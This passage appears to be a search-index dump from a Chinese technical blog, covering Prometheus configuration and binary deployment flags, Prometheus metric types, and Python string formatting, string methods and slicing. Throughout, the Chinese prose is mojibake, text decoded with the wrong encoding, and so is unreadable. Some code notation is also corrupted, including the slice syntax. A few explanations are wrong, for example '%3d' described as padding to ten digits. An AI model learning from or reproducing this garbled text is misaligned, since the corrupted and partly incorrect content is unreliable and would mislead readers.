rules):å…è®¸é¢„å…ˆè®¡ç®—ä½¿ç”¨é¢‘ç¹ä¸”å¼€é”€å¤§çš„è¡¨è¾¾å¼ï¼Œå¹¶å°†ç»“æœä¿å­˜ä¸ºä¸€ä¸ªæ–°çš„æ—¶é—´åºåˆ—æ•°æ®ï¼Œç„¶åæŸ¥è¯¢çš„æ—¶å€™å°±ä¸ä¼šè€—è´¹å¤ªå¤šçš„ç³»ç»Ÿèµ„æºå’ŒåŠ å¿«æŸ¥è¯¢é€Ÿåº¦ã€‚ è­¦æŠ¥è§„åˆ™(alerting rules): è¿™ä¸ªå°±æ˜¯è‡ªå®šä¹‰å‘Šè­¦è§„åˆ™çš„ # åŠ è½½æŒ‡å®šçš„è§„åˆ™æ–‡ä»¶ rule_files: - \"first.rules\" - \"my/*.rules\" ","date":"2020-08-31 17:54","objectID":"/post/1963/:2:0","tags":["prometheus"],"title":"prometheus-é…ç½®æ–‡ä»¶-globalã€rule_filesã€remote_read|write(ä¸€)","uri":"/post/1963/"},{"categories":["ç›‘æ§"],"content":"ä¸‰ã€remote_readã€remote_writeï¼ˆè¿œç¨‹è¯»å†™é…ç½®ï¼‰ remote_write: # æŒ‡å®šå†™å…¥æ•°æ®çš„url - url: http://remote1/push # è¿œç¨‹å†™é…ç½®çš„åç§°ï¼Œå¦‚æœæŒ‡å®šï¼Œåˆ™åœ¨è¿œç¨‹å†™é…ç½®ä¸­å¿…é¡»æ˜¯å”¯ä¸€çš„ã€‚è¯¥åç§°å°†ç”¨äºåº¦é‡æ ‡å‡†å’Œæ—¥å¿—è®°å½•ä¸­ï¼Œä»£æ›¿ç”Ÿæˆçš„å€¼ï¼Œä»¥å¸®åŠ©ç”¨æˆ·åŒºåˆ†è¿œç¨‹å†™å…¥é…ç½®ã€‚ name: drop_expensive # è¿œç¨‹å†™é‡æ–°æ‰“æ ‡ç­¾é…ç½® write_relabel_configs: - source_labels: [__name__] regex: expensive.* action: drop # æŒ‡å®šå†™å…¥æ•°æ®çš„ç¬¬äºŒä¸ªurl - url: http://remote2/push name: rw_tls # tlsè¿æ¥é…ç½® tls_config: cert_file: valid_cert_file key_file: valid_key_file remote_read: # æŒ‡å®šè¯»å–æ•°æ®çš„url - url: http://remote1/read # è¡¨ç¤ºè¿‘æœŸæ•°æ®ä¹Ÿè¦ä»è¿œç¨‹å­˜å‚¨è¯»å–ï¼Œå› ä¸ºPrometheusè¿‘æœŸæ•°æ®æ— è®ºå¦‚ä½•éƒ½æ˜¯è¦è¯»æœ¬åœ°å­˜å‚¨çš„ã€‚è®¾ç½®ä¸ºtrueæ—¶ï¼ŒPrometheusä¼šæŠŠæœ¬åœ°å’Œè¿œç¨‹çš„æ•°æ®è¿›è¡ŒMergeã€‚é»˜è®¤æ˜¯falseï¼Œå³ä»æœ¬åœ°ç¼“å­˜æŸ¥è¯¢è¿‘æœŸæ•°æ®. read_recent: true name: default # æŒ‡å®šè¯»å–æ•°æ®çš„ç¬¬äºŒä¸ªurl - url: http://remote3/read # ä»æœ¬åœ°ç¼“å­˜æŸ¥è¯¢è¿‘æœŸæ•°æ® read_recent: false name: read_special # å¯é€‰çš„åŒ¹é…å™¨åˆ—è¡¨ï¼Œå¿…é¡»å­˜åœ¨äºé€‰æ‹©å™¨ä¸­ä»¥æŸ¥è¯¢è¿œç¨‹è¯»å–ç«¯ç‚¹ã€‚ required_matchers: job: special tls_config: cert_file: valid_cert_file key_file: valid_key_file ","date":"2020-08-31 17:54","objectID":"/post/1963/:3:0","tags":["prometheus"],"title":"prometheus-é…ç½®æ–‡ä»¶-globalã€rule_filesã€remote_read|write(ä¸€)","uri":"/post/1963/"},{"categories":["ç›‘æ§"],"content":"1.è§£å‹ wget https://github.com/prometheus/prometheus/releases/download/v2.15.0/prometheus-2.15.0.linux-amd64.tar.gz tar xf prometheus-2.15.0.linux-amd64.tar.gz mv prometheus-2.15.0.linux-amd64/prometheus /usr/local/bin mv prometheus-2.15.0.linux-amd64/promtool /usr/local/bin ","date":"2020-08-31 16:26","objectID":"/post/1962/:0:1","tags":["prometheus"],"title":"prometheus-äºŒè¿›åˆ¶éƒ¨ç½²","uri":"/post/1962/"},{"categories":["ç›‘æ§"],"content":"2.å¯åŠ¨ mkdir -p /etc/prometheus cp prometheus-2.15.0.linux-amd64/prometheus.yml /etc/prometheus prometheus --config.file=\"/etc/prometheus/prometheus.yml\" å‚æ•°è¯´æ˜ï¼š # æŒ‡å®šé…ç½®æ–‡ä»¶ --config.file=\"/etc/prometheus/prometheus.yml\" # ç›‘å¬åœ°å€å’Œç«¯å£ --web.listen-address=\"0.0.0.0:9090\" # å¦‚æœä½¿ç”¨åå‘ä»£ç†è®¿é—®prometheusçš„è¯ï¼Œè¿™é‡Œé…ç½®åå‘ä»£ç†çš„åœ°å€ --web.external-url=\"http://xxx.com\" # å¼€å¯åå¯ä»¥ä½¿ç”¨httpè¯·æ±‚çš„æ–¹å¼æ¥åŠ¨æ€é‡æ–°åŠ è½½é…ç½®æ–‡ä»¶ --web.enable-lifecycle # å¼€å¯åå¯ä»¥ä½¿ç”¨apiæ¥ç®¡ç†prometheusæ•°æ® --web.enable-admin-api # ä¸‹é¢ä¸¤ä¸ªé€‰é¡¹å¯ä»¥æ·»åŠ prometheusæ§åˆ¶å°è‡ªå®šä¹‰æ¨¡æ¿é¡µé¢ --web.console.templates=\"consoles\" --web.console.libraries=\"console_libraries\" # æŒ‡å®šæŒ‡æ ‡æ•°æ®çš„å­˜å‚¨è·¯å¾„ --storage.tsdb.path=\"data/\" # æ•°æ®ä¿ç•™æ—¶é—´(y, w, d, h, m, s, ms) --storage.tsdb.retention=7d # æœ€å¤šèƒ½ä½¿ç”¨çš„ç£ç›˜ç©ºé—´å¤§å°(KB, MB, GB, TB, PB) --storage.tsdb.retention.size=1GB # ä¸åˆ›å»ºé”æ–‡ä»¶ï¼Œåœ¨k8sä¸­ä»¥deploymentè¿è¡Œçš„æ—¶å€™ï¼Œå¯ä»¥åŠ ä¸Šè¿™ä¸ªå‚æ•°ï¼Œé˜²æ­¢å¼‚å¸¸é€€å‡ºæ— æ³•å¯åŠ¨ --storage.tsdb.no-lockfile # å‹ç¼©walæ–‡ä»¶ --storage.tsdb.wal-compression # å…³é—­æˆ–é‡æ–°åŠ è½½prometheusé…ç½®æ—¶ç­‰å¾…åˆ·å†™æ•°æ®çš„æ—¶é—´ --storage.remote.flush-deadline= # æ—¥å¿—çº§åˆ«(debug, info, warn, error) --log.level=info # æ—¥å¿—æ ¼å¼(logfmt, json) --log.format=logfmt ","date":"2020-08-31 16:26","objectID":"/post/1962/:0:2","tags":["prometheus"],"title":"prometheus-äºŒè¿›åˆ¶éƒ¨ç½²","uri":"/post/1962/"},{"categories":["ç›‘æ§"],"content":"æœ¬æ–‡å†…å®¹æ¥è‡ªå›¾ä¹¦prometheusç›‘æ§å®æˆ˜ ","date":"2020-08-31 13:53","objectID":"/post/1958/:0:0","tags":["prometheus"],"title":"prometheus-æŒ‡æ ‡ç±»å‹","uri":"/post/1958/"},{"categories":["ç›‘æ§"],"content":"1.æµ‹é‡å‹(gauge): ç¬¬ä¸€ç§æŒ‡æ ‡ç±»å‹æ˜¯æµ‹é‡å‹ï¼ˆgaugeï¼‰ï¼Œè¿™ç§ç±»å‹æ˜¯ä¸Šä¸‹å¢å‡çš„æ•°å­—ã€‚å¸¸è§çš„ç›‘æ§æŒ‡æ ‡å¦‚CPUã€å†…å­˜å’Œç£ç›˜ä½¿ç”¨ç‡ç­‰éƒ½å±äºè¿™ä¸ªç±»å‹ã€‚å¯¹äºä¸šåŠ¡æŒ‡æ ‡æ¥è¯´ï¼Œå¯èƒ½æ˜¯ç½‘ç«™ä¸Šçš„å®¢æˆ·æ•°é‡ã€‚ 83770-cic2e05xkvt.png ","date":"2020-08-31 13:53","objectID":"/post/1958/:0:1","tags":["prometheus"],"title":"prometheus-æŒ‡æ ‡ç±»å‹","uri":"/post/1958/"},{"categories":["ç›‘æ§"],"content":"2.è®¡æ•°å‹(counter): ç¬¬äºŒç§ç±»å‹æ˜¯è®¡æ•°å‹ï¼ˆcounterï¼‰ï¼Œè¿™ç§ç±»å‹æ˜¯éšç€æ—¶é—´å¢åŠ è€Œä¸ä¼šå‡å°‘çš„æ•°å­—ã€‚è™½ç„¶å®ƒä»¬æ°¸è¿œä¸ä¼šå‡å°‘ï¼Œä½†æœ‰æ—¶å¯ä»¥å°†å…¶é‡ç½®ä¸ºé›¶å¹¶å†æ¬¡å¼€å§‹é€’å¢ã€‚åº”ç”¨ç¨‹åºå’ŒåŸºç¡€è®¾æ–½çš„è®¡æ•°å‹ç¤ºä¾‹åŒ…æ‹¬ç³»ç»Ÿæ­£å¸¸è¿è¡Œæ—¶é—´ã€è®¾å¤‡æ”¶å‘åŒ…çš„å­—èŠ‚æ•°æˆ–ç™»å½•æ¬¡æ•°ã€‚ä¸šåŠ¡æ–¹çš„ç¤ºä¾‹å¯èƒ½æ˜¯ä¸€ä¸ªæœˆå†…çš„é”€å”®æ•°é‡æˆ–åº”ç”¨ç¨‹åºæ”¶åˆ°çš„è®¢å•æ•°é‡ã€‚ è®¡æ•°å‹æŒ‡æ ‡çš„ä¸€ä¸ªä¼˜åŠ¿åœ¨äºå®ƒä»¬å¯ä»¥è®©ä½ è®¡ç®—å˜åŒ–ç‡ã€‚æ¯ä¸ªè§‚å¯Ÿåˆ°çš„æ•°å€¼éƒ½æ˜¯åœ¨ä¸€ä¸ªæ—¶åˆ»ï¼štï¼Œä½ å¯ä»¥ä½¿ç”¨t+1å¤„çš„å€¼å‡å»tå¤„çš„å€¼ï¼Œä»¥è·å¾—ä¸¤ä¸ªå€¼ä¹‹é—´çš„å˜åŒ–ç‡ã€‚é€šè¿‡äº†è§£ä¸¤ä¸ªå€¼ä¹‹é—´çš„å˜åŒ–ç‡ï¼Œå¯ä»¥ç†è§£è®¸å¤šæœ‰ç”¨çš„ä¿¡æ¯ã€‚ä¾‹å¦‚ç™»å½•æ¬¡æ•°æŒ‡æ ‡ï¼Œä½ å¯ä»¥é€šè¿‡è®¡ç®—å˜åŒ–ç‡æ¥æŸ¥çœ‹æ¯ç§’çš„ç™»å½•æ¬¡æ•°ï¼Œè¿™æœ‰åŠ©äºç¡®å®šç½‘ç«™è¿™æ®µæ—¶é—´çš„å—æ¬¢è¿ç¨‹åº¦ã€‚ 17129-omzxiiojryk.png ","date":"2020-08-31 13:53","objectID":"/post/1958/:0:2","tags":["prometheus"],"title":"prometheus-æŒ‡æ ‡ç±»å‹","uri":"/post/1958/"},{"categories":["ç›‘æ§"],"content":"3.ç›´æ–¹å›¾(histogram): ç›´æ–¹å›¾ï¼ˆhistogramï¼‰æ˜¯å¯¹è§‚å¯Ÿç‚¹è¿›è¡Œé‡‡æ ·çš„æŒ‡æ ‡ç±»å‹ï¼Œå¯ä»¥å±•ç°æ•°æ®é›†çš„é¢‘ç‡åˆ†å¸ƒã€‚å°†æ•°æ®åˆ†ç»„åœ¨ä¸€èµ·å¹¶ä»¥è¿™æ ·çš„æ–¹å¼æ˜¾ç¤ºï¼Œè¿™ä¸ªè¢«ç§°ä¸º\"è£…ç®±\"ï¼ˆbinningï¼‰çš„è¿‡ç¨‹å¯ä»¥ç›´è§‚åœ°æŸ¥çœ‹æ•°å€¼çš„ç›¸å¯¹å¤§å°ã€‚ ç»Ÿè®¡æ¯ä¸ªè§‚å¯Ÿç‚¹å¹¶å°†å…¶æ”¾å…¥ä¸åŒçš„æ¡¶ä¸­ï¼Œè¿™æ ·å¯ä»¥äº§ç”Ÿå¤šä¸ªæŒ‡æ ‡ï¼šæ¯ä¸ªæ¡¶ä¸€ä¸ªï¼ŒåŠ ä¸Šæ‰€æœ‰å€¼çš„æ€»å’Œä»¥ åŠè®¡æ•°ã€‚ é€šå¸¸ï¼Œé¢‘ç‡åˆ†å¸ƒç›´æ–¹å›¾çœ‹èµ·æ¥åƒæ¡å½¢å›¾ 30274-jp73q0choei.png ä¸Šå›¾æ˜¯èº«é«˜é¢‘ç‡åˆ†å¸ƒçš„æ ·æœ¬ç›´æ–¹å›¾ã€‚xè½´æ˜¯èº«é«˜çš„åˆ†å¸ƒï¼Œyè½´æ˜¯å¯¹åº”çš„é¢‘ç‡å€¼ï¼Œä¾‹å¦‚å¯ä»¥çœ‹åˆ°èº«é«˜ 160ï½165cmå¯¹åº”çš„å€¼æ˜¯2ã€‚ ","date":"2020-08-31 13:53","objectID":"/post/1958/:0:3","tags":["prometheus"],"title":"prometheus-æŒ‡æ ‡ç±»å‹","uri":"/post/1958/"},{"categories":["ç›‘æ§"],"content":"4.æ‘˜è¦å‹(Summary): æ‘˜è¦å‹(Summary)ç±»ä¼¼äºç›´æ–¹å›¾ï¼Œæ‘˜è¦ä¼šé‡‡æ ·è§‚å¯Ÿç»“æœï¼ˆé€šå¸¸æ˜¯è¯·æ±‚æŒç»­æ—¶é—´å’Œå“åº”å¤§å°ä¹‹ç±»çš„ä¸œè¥¿ï¼‰ã€‚å°½ç®¡å®ƒè¿˜æä¾›äº†è§‚æµ‹å€¼çš„æ€»æ•°å’Œæ‰€æœ‰è§‚æµ‹å€¼çš„æ€»å’Œï¼Œä½†å®ƒå¯ä»¥è®¡ç®—æ»‘åŠ¨æ—¶é—´çª—å£å†…çš„å¯é…ç½®åˆ†ä½æ•°ã€‚ ","date":"2020-08-31 13:53","objectID":"/post/1958/:0:4","tags":["prometheus"],"title":"prometheus-æŒ‡æ ‡ç±»å‹","uri":"/post/1958/"},{"categories":["python"],"content":"æ–¹å¼ä¸€ï¼š %æ ¼å¼åŒ– å¸¸ç”¨çš„ä¸€äº›ï¼š %s: å­—ç¬¦ä¸² %10s:ä½¿ç”¨ç©ºæ ¼åœ¨å·¦è¾¹è¡¥é½10ä¸ªå­—ç¬¦ %-10s:ä½¿ç”¨ç©ºæ ¼åœ¨å³è¾¹è¡¥é½10ä¸ªå­—ç¬¦ %.3s:åªä¿ç•™å‰3ä¸ªå­—ç¬¦ %d: æ•´æ•° %3d:ä½¿ç”¨ç©ºæ ¼åœ¨å·¦è¾¹è¡¥é½10ä½æ•° %-3d:ä½¿ç”¨ç©ºæ ¼åœ¨å³è¾¹è¡¥é½10ä½æ•° %03d:ä½¿ç”¨0è¡¥é½3ä½æ•°ã€‚æ¯”å¦‚5è¡¥é½åå°±æ˜¯005 %f: æµ®ç‚¹æ•° %.2f:å°æ•°ç‚¹åä¿ç•™2ä½ï¼ˆå››èˆäº”å…¥ï¼‰ %6.2f:åœ¨æ•°å€¼å‰é¢ç”¨ç©ºæ ¼è¡¥é½6ä½æ•°ï¼Œå°æ•°ç‚¹åä¿ç•™2ä½ï¼ˆå››èˆäº”å…¥ï¼‰ %-6.2f:åœ¨æ•°å€¼åé¢ç”¨ç©ºæ ¼è¡¥é½6ä½æ•°ï¼Œå°æ•°ç‚¹åä¿ç•™2ä½ï¼ˆå››èˆäº”å…¥ï¼‰ ","date":"2020-08-31 08:48","objectID":"/post/1956/:1:0","tags":["python"],"title":"python-å­—ç¬¦ä¸²æ ¼å¼åŒ–","uri":"/post/1956/"},{"categories":["python"],"content":"1.ç›´æ¥ä½¿ç”¨ # ç›´æ¥ç™¾åˆ†å·ä½¿ç”¨ 'ä½ å¥½å•Šï¼Œæˆ‘æ˜¯%s,ä»Šå¤©æ˜¯%dæœˆ%dæ—¥' % ('soulchild',8,31) # æ·»åŠ åˆ«å 'ä½ å¥½å•Šï¼Œæˆ‘æ˜¯%(name)s,ä»Šå¤©æ˜¯%(month)dæœˆ%(day)dæ—¥' % {'name':'soulchild','month':8,'day':31} ","date":"2020-08-31 08:48","objectID":"/post/1956/:1:1","tags":["python"],"title":"python-å­—ç¬¦ä¸²æ ¼å¼åŒ–","uri":"/post/1956/"},{"categories":["python"],"content":"2.å¡«å……è¡¥é½ # %-10sï¼šè¡¨ç¤ºä½¿ç”¨ç©ºæ ¼åœ¨å³è¾¹è¡¥é½10ä¸ªå­—ç¬¦ s=['python', 'java', 'golang', 'ruby', 'erlang', 'php'] for i,k in enumerate(s): print('%-10s%d' %(k,i)) # ç»“æœï¼š python 0 java 1 golang 2 ruby 3 erlang 4 php 5 ########################################################## # %10sï¼šè¡¨ç¤ºä½¿ç”¨ç©ºæ ¼åœ¨å·¦è¾¹è¡¥é½10ä¸ªå­—ç¬¦ s=['python', 'java', 'golang', 'ruby', 'erlang', 'php'] for i,k in enumerate(s): print('%10s%d' %(k,i)) # ç»“æœï¼š python0 java1 golang2 ruby3 erlang4 php5 ########################################################## # %05dï¼šè¡¨ç¤ºä½¿ç”¨0åœ¨å‰é¢è¡¥é½5ä½æ•° s=['python', 'java', 'golang', 'ruby', 'erlang', 'php'] for i,k in enumerate(s): print('%-10s%05d' %(k,i)) # ç»“æœï¼š python 00000 java 00001 golang 00002 ruby 00003 erlang 00004 php 00005 ","date":"2020-08-31 08:48","objectID":"/post/1956/:1:2","tags":["python"],"title":"python-å­—ç¬¦ä¸²æ ¼å¼åŒ–","uri":"/post/1956/"},{"categories":["python"],"content":"æ–¹å¼äºŒï¼šformatæ ¼å¼åŒ– ä½¿ç”¨{}å ä½ æ ¼å¼ï¼š {}:â€”â€”â€”-æŒ‰ç…§é¡ºåºå¡«å…… {ç´¢å¼•}: â€”â€”â€”-æŒ‰æŒ‡å®šä½ç½®å¡«å…… {name}: â€”â€”â€”-æŒ‰ç…§åç§°æˆ–å­—å…¸key {:b}{:d}{:o}{:x}{.3f}: â€”â€”â€”-b:äºŒè¿›åˆ¶ã€d:åè¿›åˆ¶ o:8å…«è¿›åˆ¶ x:åå…­è¿›åˆ¶ .3f:ä¿ç•™3ä½å°æ•°(å››èˆäº”å…¥) {:,}: â€”â€”â€”-åƒä½åˆ†éš”ç¬¦çš„æ–¹å¼æ˜¾ç¤ºæ•°å€¼ã€‚ä¾‹å¦‚:100,000 {:0\u003e4.1f}: â€”â€”â€”-0\u003e:ä½¿ç”¨0å·¦è¾¹å¡«å……,å¯ä»¥è‡ªå®šä¹‰å¡«å……ç¬¦ã€‚4:æ€»é•¿åº¦ã€‚.1f:ä¿ç•™1ä½å°æ•°(å››èˆäº”å…¥) \u003cï¼Œåœ¨å³è¾¹å¡«å…… \u003eï¼Œåœ¨å·¦è¾¹å¡«å…… ^ï¼Œåœ¨ä¸¤è¾¹å¡«å…… {!r}: â€”â€”â€”-!r:ä¸ä½¿ç”¨è½¬æ„ç¬¦ï¼Œç›¸å½“äºrâ€™abc\\ndef' # æŒ‰é¡ºåºå¡«å…… print('ä½ å¥½å•Šï¼Œæˆ‘æ˜¯{},ä»Šå¤©æ˜¯{}æœˆ{}æ—¥'.format('soulchild',8,31)) # ä½ å¥½å•Šï¼Œæˆ‘æ˜¯soulchild,ä»Šå¤©æ˜¯8æœˆ31æ—¥ # æŒ‰æŒ‡å®šä½ç½®å¡«å…… print('ä½ å¥½å•Šï¼Œæˆ‘æ˜¯{1},ä»Šå¤©æ˜¯{0}æœˆ{2}æ—¥,{2}æ—¥æ˜¯æ˜ŸæœŸä¸€'.format(8,'soulchild','31')) # ä½ å¥½å•Šï¼Œæˆ‘æ˜¯soulchild,ä»Šå¤©æ˜¯8æœˆ31æ—¥,31æ—¥æ˜¯æ˜ŸæœŸä¸€ # æŒ‰ç…§åç§°å¡«å…… print('ä½ å¥½å•Šï¼Œæˆ‘æ˜¯{name},ä»Šå¤©æ˜¯{month}æœˆ{day}æ—¥'.format(name='soulchild',month=8,day=31)) # ä½ å¥½å•Šï¼Œæˆ‘æ˜¯soulchild,ä»Šå¤©æ˜¯8æœˆ31æ—¥ # é€šè¿‡å­—å…¸çš„æ–¹å¼å¡«å…… info = {'name': 'soulchild', 'month': 8, 'day': 31} print('ä½ å¥½å•Šï¼Œæˆ‘æ˜¯{name},ä»Šå¤©æ˜¯{month}æœˆ{day}æ—¥'.format(**info)) # ä½ å¥½å•Šï¼Œæˆ‘æ˜¯soulchild,ä»Šå¤©æ˜¯8æœˆ31æ—¥ # åƒä½åˆ†éš”ç¬¦çš„æ–¹å¼æ˜¾ç¤ºæ•°å€¼ print('æˆ‘æœ‰å¤šå°‘é’±ï¼Ÿä½ å»æ•°å§ï¼š{:,}'.format(100000123120000)) æˆ‘æœ‰å¤šå°‘é’±ï¼Ÿä½ å»æ•°å§ï¼š100,000,123,120,000 # 0\u003e4ï¼šé•¿åº¦ä¸æ»¡è¶³4çš„è¯ï¼Œåœ¨æ•°å€¼çš„å‰é¢ç”¨0è¿›è¡Œè¡¥é½ï¼Œ.1f:ä¿ç•™1ä½å°æ•°(å››èˆäº”å…¥) print('å·²ä¸‹è½½{:0\u003e4.1f}%'.format(5.21)) # ä¸è§£æè½¬ä¹‰ç¬¦ print('å†…å®¹:{0}\\nåŸå†…å®¹{0!r}'.format('soul\\nchild')) å†…å®¹:soul child åŸå†…å®¹'soul\\nchild' ","date":"2020-08-31 08:48","objectID":"/post/1956/:2:0","tags":["python"],"title":"python-å­—ç¬¦ä¸²æ ¼å¼åŒ–","uri":"/post/1956/"},{"categories":["python"],"content":"1.æŸ¥æ‰¾ s='asnd82nkldodkspby' #findå’Œindexéƒ½æ˜¯æŸ¥æ‰¾å­—ç¬¦ä¸²çš„ä¸‹æ ‡ï¼Œfindæ‰¾ä¸åˆ°ä¼šè¿”å›-1ï¼Œindexä¼šæŠ›å‡ºå¼‚å¸¸ s.find('n') #2 s.index('n') #2 ","date":"2020-08-30 17:04","objectID":"/post/1951/:0:1","tags":["python"],"title":"python-å­—ç¬¦ä¸²åŸºæœ¬æ“ä½œ","uri":"/post/1951/"},{"categories":["python"],"content":"2.å­—ç¬¦ä¸²åˆ¤æ–­ startswithã€endswithã€isalphaã€isdigitã€isalnumã€isspace #æ˜¯å¦ä»¥hå¼€å¤´ 'helloworld'.startswith('h') #æ˜¯å¦ä»¥dç»“å°¾ 'helloworld'.endswith('d') #æ˜¯å¦å…¨æ˜¯å­—æ¯ 'helloworld'.isalpha() #æ˜¯å¦å…¨æ˜¯æ•°å­—,åªè®¤æ­£æ•´æ•°ï¼Œä¸è®¤å°æ•°ã€è´Ÿæ•° 'helloworld'.isdigit() #æ˜¯å¦å…¨æ˜¯å­—æ¯æ•°å­— 'helloworld'.isalnum() #æ˜¯å¦å…¨æ˜¯ç©ºæ ¼ 'helloworld'.isspace() ","date":"2020-08-30 17:04","objectID":"/post/1951/:0:2","tags":["python"],"title":"python-å­—ç¬¦ä¸²åŸºæœ¬æ“ä½œ","uri":"/post/1951/"},{"categories":["python"],"content":"3.ç»Ÿè®¡å­—ç¬¦ä¸²å‡ºç°æ¬¡æ•° print('helloworld'.count('o')) 2 ","date":"2020-08-30 17:04","objectID":"/post/1951/:0:3","tags":["python"],"title":"python-å­—ç¬¦ä¸²åŸºæœ¬æ“ä½œ","uri":"/post/1951/"},{"categories":["python"],"content":"4.å­—ç¬¦ä¸²æ›¿æ¢ # å°†læ›¿æ¢ä¸ºwï¼Œæ›¿æ¢1æ¬¡ï¼Œä¸æŒ‡å®šæ¬¡æ•°å°±å…¨éƒ¨æ›¿æ¢ print('helloworld'.replace('l','w',1)) ","date":"2020-08-30 17:04","objectID":"/post/1951/:0:4","tags":["python"],"title":"python-å­—ç¬¦ä¸²åŸºæœ¬æ“ä½œ","uri":"/post/1951/"},{"categories":["python"],"content":"5.å­—ç¬¦ä¸²åˆ†å‰² splitã€rsplitã€partitionã€rpartition #split################################################### s='python|java|golang|ruby|erlang|php' # ä»¥`|`åˆ†å‰²3æ¬¡ï¼Œè¿”å›ä¸€ä¸ªåˆ—è¡¨ã€‚ä¸æŒ‡å®šæ¬¡æ•°å°±å…¨éƒ¨åˆ†å‰² s.split('|',3) # ç»“æœï¼š['python', 'java', 'golang', 'ruby|erlang|php'] # ä»å³è¾¹å¼€å§‹åˆ†å‰² s.rsplit('|',3) # ç»“æœï¼š['python|java|golang', 'ruby', 'erlang', 'php'] #partition############################################### url=\"www.soulchild.cn\" # å°†å­—ç¬¦ä¸²åˆ†å‰²ä¸ºä¸‰éƒ¨åˆ†ï¼Œåˆ†åˆ«æ˜¯:'åˆ†å‰²ç¬¦å‰é¢çš„å†…å®¹'ã€'åˆ†å‰²ç¬¦'ã€'åˆ†å‰²ç¬¦åé¢çš„å†…å®¹'ã€‚ # åªä¼šä»¥æœ€å·¦è¾¹çš„åˆ†å‰²ç¬¦å¼€å§‹åˆ†å‰² url.partition('soulchild') # ç»“æœï¼š('www.', 'soulchild', '.cn') # ä»å³è¾¹å¼€å§‹åˆ†å‰² url.rpartition('soulchild') ","date":"2020-08-30 17:04","objectID":"/post/1951/:0:5","tags":["python"],"title":"python-å­—ç¬¦ä¸²åŸºæœ¬æ“ä½œ","uri":"/post/1951/"},{"categories":["python"],"content":"6.ä¿®æ”¹å¤§å°å†™ capitalize:é¦–å­—æ¯è½¬æ¢æˆå¤§å†™ upper:å…¨éƒ¨è½¬æ¢æˆå¤§å†™ lower:å…¨éƒ¨è½¬æ¢æˆå°å†™ title:æ¯ä¸ªå•è¯çš„é¦–å­—æ¯è½¬æ¢æˆå¤§å†™ # capitalize: print('hello world'.capitalize()) # ç»“æœï¼š Hello world ","date":"2020-08-30 17:04","objectID":"/post/1951/:0:6","tags":["python"],"title":"python-å­—ç¬¦ä¸²åŸºæœ¬æ“ä½œ","uri":"/post/1951/"},{"categories":["python"],"content":"7.ç©ºæ ¼å¤„ç† ljust: åœ¨æœ€å³è¾¹ç”¨ç©ºæ ¼è¡¥å¤Ÿå­—ç¬¦é•¿åº¦ã€‚é»˜è®¤æ˜¯ç©ºæ ¼ä¹Ÿå¯ä»¥è‡ªå·±æŒ‡å®šfillcharå‚æ•° rjust: åŒä¸Šï¼Œä½†æ˜¯ä¼šåœ¨æœ€å·¦è¾¹è¡¥ center: åœ¨ä¸¤è¾¹è¡¥ï¼Œå­—ç¬¦ä¸²åœ¨ä¸­é—´ lstrip: å»é™¤å·¦è¾¹ç©ºæ ¼,é»˜è®¤å»é™¤ç©ºæ ¼ï¼Œä¹Ÿå¯ä»¥æŒ‡å®šå…¶ä»–å­—ç¬¦â€“charså‚æ•° rstrip: å»é™¤å³è¾¹ç©ºæ ¼,é»˜è®¤å»é™¤ç©ºæ ¼ï¼Œä¹Ÿå¯ä»¥æŒ‡å®šå…¶ä»–å­—ç¬¦â€“charså‚æ•° strip: é¦–å°¾å»é™¤ç©ºæ ¼,é»˜è®¤å»é™¤ç©ºæ ¼ï¼Œä¹Ÿå¯ä»¥æŒ‡å®šå…¶ä»–å­—ç¬¦â€“charså‚æ•° # helloæœ‰5ä¸ªå­—ç¬¦ï¼Œæˆ‘ä»¬è¦10ä¸ªï¼Œæ‰€ä»¥åœ¨helloåé¢ä¼šè¡¥5ä¸ªç©ºæ ¼ print('hello'.ljust(10)) ","date":"2020-08-30 17:04","objectID":"/post/1951/:0:7","tags":["python"],"title":"python-å­—ç¬¦ä¸²åŸºæœ¬æ“ä½œ","uri":"/post/1951/"},{"categories":["python"],"content":"8.æ‹¼æ¥å¯è¿­ä»£å¯¹è±¡ join: ä½¿ç”¨æŒ‡å®šçš„å­—ç¬¦ä¸²è¿æ¥å¯è¿­ä»£å¯¹è±¡çš„æ¯ä¸€ä¸ªå…ƒç´ ï¼Œç”Ÿæˆä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸² s=['python', 'java', 'golang', 'ruby', 'erlang', 'php'] # ä½¿ç”¨/å°†åˆ—è¡¨çš„æ¯ä¸€ä¸ªå…ƒç´ è¿æ¥èµ·æ¥ print('/'.join(s)) # ç»“æœ: python/java/golang/ruby/erlang/php ","date":"2020-08-30 17:04","objectID":"/post/1951/:0:8","tags":["python"],"title":"python-å­—ç¬¦ä¸²åŸºæœ¬æ“ä½œ","uri":"/post/1951/"},{"categories":["python"],"content":"æ‹¿å­—ç¬¦ä¸²ä¸¾ä¾‹ï¼š s=\"helloworld\" åˆ‡ç‰‡è¯­æ³•ï¼š s[startğŸ”šstep] ä»0åˆ‡åˆ°5: s[0:5]ï¼šhello ä»1åˆ‡åˆ°æœ€å s[1:]ï¼šelloworld ä»å¼€å¤´å¼€å§‹åˆ‡3ä½ s[:3]ï¼šï¼šhel ä»ç¬¬ä¸€ä½åˆ‡åˆ°å€’æ•°ç¬¬äº”ä½ s[1:-5]ï¼šello æŒ‡å®šæ­¥é•¿ä¸º2 s[2:8:2]ï¼šloo å€’ç€å– s[-2:2:-1]ï¼šlrowol åè½¬ s[::-1]ï¼šdlrowolleh ","date":"2020-08-30 13:19","objectID":"/post/1948/:0:0","tags":["python"],"title":"python-åˆ‡ç‰‡","uri":"/post/1948/"},{"categories":["python"],"content":"å…ˆç®€å•è¯´ä¸€äº›æ¦‚å¿µï¼š åŸç ï¼šä»ç¬¦å·ä½å¼€å§‹è¡¨ç¤ºï¼Œ0æ˜¯æ­£æ•°ï¼Œ1æ˜¯è´Ÿæ•° åç ï¼š æ­£æ•°çš„åŸç åç è¡¥ç éƒ½æ˜¯ä¸€æ ·çš„ã€‚ è´Ÿæ•°çš„åç æ˜¯åœ¨å…¶åŸç çš„åŸºç¡€ä¸Š, ç¬¦å·ä½ä¸å˜ï¼Œå…¶ä½™å„ä¸ªä½å–å æ¯”å¦‚-5è½¬æˆäºŒè¿›åˆ¶åŸç 1101ï¼Œåœ¨ç®—å‡ºåç 1010 è¡¥ç ï¼š æ­£æ•°çš„åŸç åç è¡¥ç éƒ½æ˜¯ä¸€æ ·çš„ã€‚ è´Ÿæ•°çš„è¡¥ç æ˜¯åç +1 ","date":"2020-08-29 22:10","objectID":"/post/1947/:0:0","tags":["python"],"title":"python-ä½è¿ç®—","uri":"/post/1947/"},{"categories":["python"],"content":"1.æŒ‰ä½ä¸\u0026: 